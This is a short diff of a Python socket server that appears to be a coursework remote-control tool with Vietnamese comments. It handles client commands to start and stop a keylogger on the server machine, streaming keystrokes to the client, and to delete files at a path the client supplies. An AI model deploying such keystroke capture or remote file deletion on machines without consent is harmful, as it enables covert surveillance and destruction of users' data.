@@ -57,12 +57,11 @@ def handle_client(client_socket):
                 
             # Yêu cầu 5. Khóa / Bắt phím nhấn (keylogger) ở máy SERVER
             elif buffer.startswith("START_KEY_LOGGER"):
-                print("Starting keylogger...")
-                # Start the keylogger and send keystrokes to the client
+                print("Starting keylogger...")                
                 start_keylogger(client_socket)
-            elif buffer.startswith("STOP_KEY_LOGGER"):            
-                print("Stopping keylogger...")    
-                
+            elif buffer == "STOP_KEY_LOGGER":
+                print("Keylogger stopped")  
+                        
             # Yêu cầu 6. Xóa files ; Copy files từ máy SERVER
             elif buffer.startswith("DELETE_FILE"):
                 file_path = buffer.split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
